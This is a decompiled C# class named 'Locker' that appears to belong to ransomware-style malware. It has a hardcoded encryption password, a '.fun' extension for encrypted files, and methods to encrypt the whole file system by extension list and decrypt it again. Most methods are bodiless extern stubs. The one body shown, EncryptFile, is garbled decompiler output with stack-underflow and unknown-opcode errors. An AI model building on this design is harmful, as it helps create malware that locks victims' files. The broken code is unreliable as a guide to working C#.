using System.Collections.Generic;
using System.Security.Cryptography;

namespace Main.Tools;

internal static class Locker
{
	private static readonly string EncryptedFileListPath;

	private static readonly HashSet<string> EncryptedFiles;

	private const string EncryptionFileExtension = ".fun";

	private const string EncryptionPassword = "OoIsAwwF23cICQoLDA0ODe==";

	internal static extern void EncryptFileSystem();

	internal static extern HashSet<string> GetEncryptedFiles();

	private static extern string CreateFileSystemSimulation();

	private static extern IEnumerable<string> GetExtensionsToEncrypt();

	private static extern IEnumerable<string> GetFiles(string path);

	private static extern void EncryptFiles(string dirPath, string encryptionExtension, HashSet<string> extensionsToEncrypt);

	internal static extern void DecryptFiles(string encryptionExtension);

	private static bool EncryptFile(string path, string encryptionExtension)
	{
		//Discarded unreachable code: IL_000e, IL_001b, IL_0022, IL_0029
		//IL_0008: Invalid comparison between Unknown and I4
		//IL_0012: Unsupported input type for neg.
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected I8, but got Unknown
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			if ((int)/*Error near IL_0005: Stack underflow*/ != 0)
			{
				sbyte num = ((sbyte[])/*Error near IL_0007: Stack underflow*/)[/*Error near IL_0007: Stack underflow*/];
				if ((int)/*Error near IL_000d: Stack underflow*/ == num)
				{
					break;
				}
			}
		}
		/*Error near IL_000d: Unknown opcode: 0xF9*/;
	}

	private static extern void DecryptFile(string path, string encryptionExtension);

	private static extern void EncryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile);

	private static extern void DecryptFile(SymmetricAlgorithm alg, string inputFile, string outputFile);
}
